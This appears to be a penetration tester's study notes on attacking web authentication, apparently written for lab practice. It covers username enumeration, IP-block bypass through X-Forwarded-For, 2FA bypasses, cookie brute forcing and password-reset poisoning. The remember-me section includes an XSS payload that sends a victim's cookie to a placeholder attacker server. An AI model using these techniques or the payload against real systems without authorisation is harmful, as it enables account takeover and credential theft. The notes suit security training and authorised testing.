![[Authentication.png]]
# Recon

Walk through the app and identify any processes that pertain to user identification (e.g. login, registration, reset/forgot password, etc..). Analyze the source code of the app and identify any files or comments or any other resources that may leak information that helps identify valid users.

Use enumeration tools to discover more content such as hidden directories or files which may leak information about valid users or other authentication related processes (tools include Burp Pro discover content, gobuster, ffuf, etc..).

Determine if there is a consistent account name email/structure (John Doe = jdoe@test.com) - can help to identify potential users of the application. All the information can be helpful when performing authentication related testing.
# Verbose Messages - Username Enumeration

Submit invalid credentials to an authentication related function and analyze the response. Identify if there is a way to enumerate valid credentials based off any error messages the app is returning. For example, if the username is incorrect the app returns the error message "Invalid username", however, when the password is incorrect, the app returns the error message "Invalid password".

The responses may also have a very minor difference that can be difficult to identify just by looking at them. You can use Intruder's "Grep-Match" function to see which responses does not contain the known message.

For example, when the username is incorrect the message will be "Invalid username or password.", but when the password is incorrect the message changes to "Invalid username or password" (missing period at the end).
# Misconfiguration bypass - User Enumeration via Response Timing

Sometimes, the app will not validate the password field unless the submitted username exists on the application. You can take advantage of the logic and submit requests that contain a very long password, and brute force for valid usernames. The valid username should have a notable difference in the time taken to receive the response.

If the app is also blocking incorrect attempts, you can use the X-Forwarded-For header to spoof IP addresses. The "Pitchfork" attack type can be used here:

- First payload position - 192.0.1.\%\%
- Second payload position - can be the username parameter

>[!info]
>Ensure that the password submitted is over 25 characters and ensure max concurrent requests is set to 1.
# Brute force protection bypass - IP Block

The app may be blocking requests after a certain number of invalid requests that are submitted. You can potentially bypass it by using the X-Forwarded-For header in requests to spoof the IP address.

# Brute Force Protection Bypass - IP Block + Valid Creds

The app may be blocking requests after a certain number of invalid requests that are submitted. You can try submitting valid credentials before that limit is reached and see if you can bypass the protection. If it works, you must include the valid creds in the brute force requests to prevent from being blocked and bypass the logic.

The "pitchfork" attack can be used:

- Payload positions on username and password parameters
- Set the max concurrent requests to 1
# Logic Flaw Bypass - via Account Lockout

The app may be blocking authentication requests after a certain number of invalid requests are submitted. However, sometimes the app will only lock out accounts that actually exist. You can use the logic to gather valid accounts on the app, if the requests get blocked or similiar, the username may be a valid one.

The "cluster bomb" attack can be used:

- Payload positions - "username"
- and "password" (around 6 random is fine, just in case the account lockout is after 5 incorrect attempts)

Which ever username is blocked is the valid one.
# Logic Flaw Bypass - Multiple Creds per Request

It might be possible to submit multiple passwords with just one HTTP request by using an array of strings - ["test123", "password", ...].
# 2FA Bypass - Force Browse

When directed to a page where the 2FA code needs to be submitted, force browse to another page - it may bypass the 2FA code requirement.
# 2FA - Broken Logic

Strictly analyze the authentication process and identify if there are any parameters/headers/endpoints that are explicitly used to determine which user the 2FA code will be created for. If you can tamper with the values, you may be able to login to the app as another user without needing to know their authentication credentials.

For example, after logging into the app with valid creds, there is a request that is submitted to the app which contains the following Cookie - cookie: verify=user1. Change the value to another valid user in the app.

When submitting the request when entering the 2FA code include/change the same cookie value and either brute force the 2FA code or include the code you obtain and see if it bypasses any logic flaws.
# 2FA Bypass - Brute force attack Burp Macro

If the app is terminating the valid session cookie after a certain amount of incorrect 2FA code attempts, then you can use a Burp Macro to create a new session after every request that is sent through Burp's PRoxy, Repeater, Intruder, etc...
# Brute Force Protection Bypass - Stay-Logged-In

Use all the app's functionality that is available. If the app has a "Remember me" function after logging in, use it and identify how the app is implementing this feature. If the feature is insecure, you can exploit it to potentially log into the app as another user or enumerate valid accounts.

For example, after clicking on the "Remember me" functionality, the app sets a new cookie on the client. The cookie is generated by hashing the user's password with an insecure hashing algorithm with no salt and appending their username to it. If there are no brute force protections on the cookie, you can use the vector to brute force the creds of another user.

Use Intruder "Payload Processing" to transform the payload into the required format so the brute force works correectly.

Another example - if the app contains an XSS vulnerability, you can inject the payload to steal another user's cookie and crack the password offline too:

```javascript
<script>document.location='https://ATTACKER-SERVER.COM/'+document.cookie </script>
```
# Auth Bypass - Password Reset Broken Logic

Use all of the app's functionality related to authentication such as Forgot password, reset password, update password, etc.. Analyze the entire process and identify any interesting headers/parameters that are potentially being used to identify which user the requests are being initiated for. Change these values to another account and analyze how the app responds.

For example, when using the "Forgot Password" functionality, there is a body parameter called "username". It may be possible to update the password of any valid user on the app by simply changing the value of the parameter.
# Authentication Bypass - Password Reset Poisoning via Middleware

When using the "Forgot password" functionality, identify if it is possible to manipulate the domain used in the password reset link. You can use headers such as Host, X-Forwarded-For or X-Host to do this. If it is possible, you can steal another user's reset token to update their password.

For example, if you can manipulate the password reset link to be `https://attacker-server.com/reset?token=xxx`, when the user clicks on the link that they receive in their email,, the request will be sent to the attacker server and the query parameter will be logged. Now, you can use the password reset token in the correct app domain to reset the victim user's password.

As an example:

- X-Forwarded-Host: exploit-server.web-security-academy.net

# Verbose Messages / Brute Force - via Password Change

The login page is not the only place that can contain overly verbose error messages indicating that a username or password is correct/incorrect. If the app has a change password functionality, you can potentially use the function to brute force the correct password of another user by using the app's verbose responses.

For example, in a change password function, supplying different combinations for correct/incorrect values in the userName, currentPassword, newPAssword, and confirmNewPassword parameters may result in a method to enumerate user credentials.

As an example:

- When the user current password is NOT the correct value and the new passwords match == redirect to /login
- When the user current password is NOT the correct value and the new passwords do not match == Error message "Current password is incorrect"
- When the user current password is correct and the new passwords do not match == Error message "New passwords do not match"

